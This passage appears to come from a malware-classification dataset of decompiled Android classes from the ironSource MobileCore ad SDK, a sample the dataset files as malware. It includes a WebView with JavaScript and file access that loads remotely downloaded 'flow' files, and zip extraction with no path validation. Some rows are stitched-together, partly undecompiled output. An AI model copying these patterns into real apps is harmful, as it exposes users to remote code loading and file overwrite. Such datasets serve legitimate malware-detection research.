this.d.addView(linearLayout);       this.d.addView(imageView);       addView(this.d);       addView(imageView2);       this.b=bVar;     }  catch (    Exception e2) {       aE.a(MobileCore.c(),getClass().getName(),e2);     }   }   private static int a(  Context context){     int f;     try {       Display defaultDisplay=((WindowManager)context.getSystemService(""window"")).getDefaultDisplay();       if (Build.VERSION.SDK_INT >= 14) {         if (ViewConfiguration.get(context).hasPermanentMenuKey()) {           f=aE.f(context);         }  else {           Point point=new Point();           defaultDisplay.getSize(point);           f=point.x;         }       }  else {         f=aE.f(context);       }       return f;     }  catch (    Exception e2) {       return aE.f(context);     }   }   @Override public final boolean onTouch(  View view,  MotionEvent motionEvent){     return true;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\aV.code","public final class aV extends RelativeLayout {   private ProgressBar a;   private ImageView b;   private AsyncTask<String,Void,Bitmap> c;   public aV(  Context context){     super(context);     this.c=new AsyncTask<String,Void,Bitmap>(){       @Override protected final Bitmap doInBackground(      String[] strArr){         return a(strArr);       }       @Override protected final void onPostExecute(      Bitmap bitmap){         Bitmap createBitmap;         Bitmap bitmap2=bitmap;         if (bitmap2 == null) {           createBitmap=null;         }  else {           createBitmap=Bitmap.createBitmap(bitmap2.getWidth(),bitmap2.getHeight(),Bitmap.Config.ARGB_8888);           Canvas canvas=new Canvas(createBitmap);           Paint paint=new Paint();           Rect rect=new Rect(0,0,bitmap2.getWidth(),bitmap2.getHeight());           RectF rectF=new RectF(rect);           paint.setAntiAlias(true);           canvas.drawARGB(0,0,0,0);           paint.setColor(-12434878);           canvas.drawRoundRect(rectF,40.0f,40.0f,paint);           paint.setXfermode(new PorterDuffXfermode(PorterDuff.Mode.SRC_IN));           canvas.drawBitmap(bitmap2,rect,rect,paint);         }         aV.this.b.setImageBitmap(createBitmap);         aV.this.a.setVisibility(8);         aV.this.b.setVisibility(0);       }       private static Bitmap a(      String... strArr){         String replace=strArr[0].replace(""file:///"","""");         Bitmap bitmap=null;         try {           bitmap=BitmapFactory.decodeFile(replace);         }  catch (        Exception e) {           Log.e(""WebImageView load Error of url "" + replace,e.getMessage());           e.printStackTrace();         }         if (bitmap == null) {           Log.d(""MobileCore"",""Failed to load image "" + replace);           return B.a(""iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjFGRDQ5OTMzNUQ5RDExRTNCQ0I0Q0U0QUU0NUM0OTJGIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjFGRDQ5OTM0NUQ5RDExRTNCQ0I0Q0U0QUU0NUM0OTJGIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6MUZENDk5MzE1RDlEMTFFM0JDQjRDRTRBRTQ1QzQ5MkYiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6MUZENDk5MzI1RDlEMTFFM0JDQjRDRTRBRTQ1QzQ5MkYiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz5gcz1cAAAQUUlEQVR42uyde3BU133H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"");         }         return bitmap;       }     } ;     this.b=new ImageView(context);     this.b.setLayoutParams(new RelativeLayout.LayoutParams(-1,-1));     this.b.setVisibility(4);     this.b.setScaleType(ImageView.ScaleType.CENTER_CROP);     this.a=new ProgressBar(context);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-2,-2);     layoutParams.addRule(13);     this.a.setLayoutParams(layoutParams);     this.a.setVisibility(0);     addView(this.b);     addView(this.a);   }   public final void a(  String str){     this.b.setVisibility(4);     this.a.setVisibility(0);     this.c.execute(str);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\aW.code","public final class aW extends WebView {   private static int b=0;   private d a;   private a c;   private b d;   public enum a {  NOT_READY,   LOADING,   READY,   ERROR} public interface b {     boolean a();     void b();   }   public aW(  Context context){     super(context);     a(a.NOT_READY);     int i=b;     b=i + 1;     setId(i);     String str=getContext().getCacheDir().getAbsolutePath() + ""/mobilecore"";     setBackgroundColor(0);     getSettings().setJavaScriptEnabled(true);     getSettings().setSupportMultipleWindows(false);     getSettings().setNeedInitialFocus(false);     getSettings().setSupportZoom(false);     getSettings().setAllowFileAccess(true);     getSettings().setAppCacheEnabled(true);     if (Build.VERSION.SDK_INT < 18) {       getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);     }     getSettings().setCacheMode(1);     getSettings().setAppCachePath(str);     setHorizontalScrollBarEnabled(false);     setInitialScale(100);     if (Build.VERSION.SDK_INT >= 11 && Build.VERSION.SDK_INT < 19) {       setLayerType(1,null);     }     setScrollBarStyle(33554432);     this.a=new d(this);     setWebChromeClient(this.a);     aE.a(this);   }   @Override public final boolean onKeyDown(  int i,  KeyEvent keyEvent){     if (i != 4 || this.d == null) {       return super.onKeyDown(i,keyEvent);     }     A.a(""WebViewWithLoadState , id:"" + getId() + "" | onKeyDown | back "",55);     this.d.a();     return true;   }   @Override protected final void onDetachedFromWindow(){     if (this.d != null) {       A.a(""WebViewWithLoadState , id:"" + getId() + "" | onDetachedFromWindow() "",55);       this.d.b();     }     super.onDetachedFromWindow();   } public static abstract class c implements aF.a {     private aW a;     public void setWebViewWithLoadState(    aW aWVar){       this.a=aWVar;     }     public final void a(){       this.a.clearHistory();       if (this.a != null) {         this.a.a(a.READY);         A.a(""WebViewWithLoadState , id:"" + this.a.getId() + "" | set mState to ""+ this.a.c,55);       }     }   }   public final boolean a(){     return this.c == a.READY;   }   public final boolean b(){     return this.c == a.ERROR;   }   public final void c(){     a(a.NOT_READY);   }   public final void d(){     a(a.ERROR);   }   public final boolean a(  String str){     if (this.c == a.LOADING) {       return false;     }     a(a.LOADING);     A.a(""WebViewWithLoadState , id:"" + getId() + "" , loadNewUrl | set mState to ""+ this.c,55);     super.loadUrl(str);     return true;   }   public final void a(  aF.a aVar){     this.a.a(aVar);   }   public final void a(  b bVar){     this.d=bVar;   }   public synchronized void a(  a aVar){     A.a(""WebViewWithLoadState , id:"" + getId() + "" , setState | from:""+ this.c+ "" , to:""+ aVar,55);     this.c=aVar;   } private class d extends aF {     public d(    WebView webView){       super(webView);     }     @Override public final boolean onConsoleMessage(    ConsoleMessage consoleMessage){       if (consoleMessage.messageLevel() == ConsoleMessage.MessageLevel.ERROR && aW.this.d != null) {         b unused=aW.this.d;       }       return super.onConsoleMessage(consoleMessage);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\aX.code","public class aX {   aX(){   }   public static boolean a(  String str,  File file){     try {       ZipInputStream zipInputStream=new ZipInputStream(new BufferedInputStream(new FileInputStream(file)));       String substring=file.getName().substring(0,file.getName().length() - 4);       File file2=new File(str + ""/"" + substring);       if (!file2.exists()) {         file2.mkdirs();       }       while (true) {         ZipEntry nextEntry=zipInputStream.getNextEntry();         if (nextEntry != null) {           ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();           byte[] bArr=new byte[android.support.v4.view.a.a.ACTION_NEXT_HTML_ELEMENT];           if (!nextEntry.isDirectory()) {             File file3=new File(str + ""/"" + substring+ ""/""+ nextEntry.getName());             if (!file3.getParentFile().exists()) {               file3.getParentFile().mkdirs();             }             File file4=new File(str + ""/"" + substring,nextEntry.getName());             file4.getParentFile().mkdirs();             FileOutputStream fileOutputStream=new FileOutputStream(file4);             while (true) {               int read=zipInputStream.read(bArr);               if (read == -1) {                 break;               }               byteArrayOutputStream.write(bArr,0,read);               fileOutputStream.write(byteArrayOutputStream.toByteArray());               byteArrayOutputStream.reset();             }             fileOutputStream.close();             byteArrayOutputStream.close();             zipInputStream.closeEntry();           }         }  else {           zipInputStream.close();           return true;         }       }     }  catch (    IOException e) {       aE.a(MobileCore.c(),aX.class.getName(),e);       return false;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\ay.code","final class ay extends F {   private Intent a;   public ay(  Context context,  C0091aw c0091aw){     super(context,c0091aw);   }   @Override public final String a(){     return ""ironsourceSocialWidgetShare"";   }   @Override public final void a(  JSONObject jSONObject) throws JSONException {     this.a=aE.a(jSONObject);     super.a(jSONObject);   }   @Override public final void a(  View view){     if (this.a != null) {       this.e.startActivity(this.a);     }     super.a(view);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\az.code","final class az extends F {   public az(  Context context,  C0091aw c0091aw){     super(context,c0091aw);   }   @Override public final String a(){     return ""ironsourceSocialWidgetGooglePlus"";   }   @Override public final void a(  JSONObject jSONObject) throws JSONException {     super.a(jSONObject);   }   @Override public final void a(  View view){     try {       aE.a(this.e,MessageFormat.format(""https://plus.google.com/share?url={0}"",aE.e(aE.j(this.c))),true);     }  catch (    UnsupportedEncodingException e) {       e.printStackTrace();     }     super.a(view);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\b.code","public class b extends aE.a {   protected b(){   }   @Override public final void a(  String str,  int i){     AbstractC0103l.this.b(""processingHttpError"",""fileName:"" + str + "" statusCode:""+ i);     AbstractC0103l.this.e();   }   @Override public final void a(  String str,  Exception exc){     A.a(""processingHttpError | "" + String.format(""failed to get flow %s, %s"",str,exc.getMessage()),3);     AbstractC0103l.this.e();   } } public interface b {   void a(); } public interface b {   void a(  int i);   void a(  Exception exc);   boolean a(  HttpResponse httpResponse); } public class b extends ArrayList<Pair<Method,ArrayList<String>>> {   private static final long serialVersionUID=1;   private b(){   }   b(  aF aFVar,  byte b){     this();   }   public final void a(  Collection<? extends Method> collection){     for (    Method method : collection) {       ArrayList arrayList=new ArrayList();       for (      Class<?> cls : method.getParameterTypes()) {         arrayList.add(cls.getName());       }       add(new Pair(method,arrayList));     }   } } public interface b {   void a();   void a(  JSONObject jSONObject);   void b();   void b(  JSONObject jSONObject);   void c(); } public interface b {   boolean a();   void b(); } public final class B { public interface a {     void a();     void a(    Bitmap bitmap);   }   public static void a(  ImageView imageView,  AnimationDrawable animationDrawable){     if (animationDrawable != null) {       a((View)imageView,(Drawable)animationDrawable);     }   }   public static final void a(  AnimationDrawable animationDrawable){     if (animationDrawable != null) {       animationDrawable.stop();       animationDrawable.setVisible(false,true);     }   }   public static final void b(  AnimationDrawable animationDrawable){     if (animationDrawable != null) {       a(animationDrawable);       animationDrawable.start();     }   }   public static Bitmap a(  Context context,  String str){     Bitmap a2=a(str);     if (a2 == null) {       return null;     }     return a(context,a2);   }   public static Bitmap a(  String str){     byte[] decode;     if (TextUtils.isEmpty(str)) {       return null;     }     try {       if (Build.VERSION.SDK_INT <= 8) {         decode=C0102k.a(str,0);       }  else {         decode=Base64.decode(str,0);       }       return BitmapFactory.decodeByteArray(decode,0,decode.length);     }  catch (    Exception e) {       return null;     }   }   public static int a(  Context context,  float f){     return (int)(context.getResources().getDisplayMetrics().density * f);   }   public static void a(  View view,  Drawable drawable){     if (Build.VERSION.SDK_INT >= 16) {       view.setBackground(drawable);     }  else {       view.setBackgroundDrawable(drawable);     }   }   public static Bitmap a(  Context context,  Bitmap bitmap){     float f=320.0f / context.getResources().getDisplayMetrics().densityDpi;     return Bitmap.createScaledBitmap(bitmap,(int)(bitmap.getWidth() / f),(int)(bitmap.getHeight() / f),true);   } public static class b {     public Rect a=new Rect();     public int[] b;     public int[] c;     public int[] d;     private b(){     }     private static void a(    int[] iArr,    ByteBuffer byteBuffer){       int length=iArr.length;       for (int i=0; i < length; i++) {         iArr[i]=byteBuffer.getInt();       }     }     private static void a(    int i){       if (i == 0 || (i & 1) != 0) {         throw new RuntimeException(""invalid nine-patch: "" + i);       }     }     public static b a(    byte[] bArr){       ByteBuffer order=ByteBuffer.wrap(bArr).order(ByteOrder.nativeOrder());       if (order.get() == 0) {         return null;       }       b bVar=new b();       bVar.b=new int[order.get()];       bVar.c=new int[order.get()];       bVar.d=new int[order.get()];       a(bVar.b.length);       a(bVar.c.length);       order.getInt();       order.getInt();       bVar.a.left=order.getInt();       bVar.a.right=order.getInt();       bVar.a.top=order.getInt();       bVar.a.bottom=order.getInt();       order.getInt();       a(bVar.b,order);       a(bVar.c,order);       a(bVar.d,order);       return bVar;     }   } } public static class b {   public Rect a=new Rect();   public int[] b;   public int[] c;   public int[] d;   private b(){   }   private static void a(  int[] iArr,  ByteBuffer byteBuffer){     int length=iArr.length;     for (int i=0; i < length; i++) {       iArr[i]=byteBuffer.getInt();     }   }   private static void a(  int i){     if (i == 0 || (i & 1) != 0) {       throw new RuntimeException(""invalid nine-patch: "" + i);     }   }   public static b a(  byte[] bArr){     ByteBuffer order=ByteBuffer.wrap(bArr).order(ByteOrder.nativeOrder());     if (order.get() == 0) {       return null;     }     b bVar=new b();     bVar.b=new int[order.get()];     bVar.c=new int[order.get()];     bVar.d=new int[order.get()];     a(bVar.b.length);     a(bVar.c.length);     order.getInt();     order.getInt();     bVar.a.left=order.getInt();     bVar.a.right=order.getInt();     bVar.a.top=order.getInt();     bVar.a.bottom=order.getInt();     order.getInt();     a(bVar.b,order);     a(bVar.c,order);     a(bVar.d,order);     return bVar;   } } public static class b {   private int a;   private int b;   public b(  JSONObject jSONObject){     if (jSONObject != null) {       this.a=Color.parseColor(jSONObject.optString(JSController.STYLE_NORMAL,""""));       String optString=jSONObject.optString(""pressed"","""");       if (TextUtils.isEmpty(optString)) {         this.b=this.a;       }  else {         this.b=Color.parseColor(optString);       }     }   }   public final int a(  boolean z){     return z ? this.a : this.b;   } } static class b extends a {   private static final int[] c={-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-2,-1,-1,-1,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,-1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1};   private static final int[] d={-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-2,-1,-1,-1,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,63,-1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1};   private int e;   private int f;   private final int[] g;   public b(  int i,  byte[] bArr){     this.a=bArr;     this.g=(i & 8) == 0 ? c : d;     this.e=0;     this.f=0;   }   public final boolean a(  byte[] r10,  int r11,  int r12,  boolean r13){     throw new UnsupportedOperationException(""Method not decompiled: com.ironsource.mobilcore.C0102k.b.a(byte[], int, int, boolean):boolean"");   } } public static class b extends c {   private WebView d;   private String e;   public b(  WebView webView,  String str,  String str2,  String str3,  aE.c cVar){     super(str,str2,cVar);     this.d=webView;     this.e=str3;   }   @Override public final boolean a(  HttpResponse httpResponse){     File b=super.b(httpResponse);     if (b == null) {       A.a(""FlowFileHandler | processFile | failed to get flow file from web. will use fallback"",3);       return false;     }     MobileCore.b().post(new Runnable(){       @Override public final void run(){         String a=b.a(b.this.b,b.this.a,b.this.e);         A.a(""FlowFileHandler | executeFlow | localUrl: "" + a,55);         b.this.d.loadUrl(a);       }     } );     if (this.c != null) {       this.c.a(this.a,b != null);     }     return true;   }   public static String a(  String str,  String str2,  String str3){     String str4=""file://"" + str + ""/""+ str2;     if 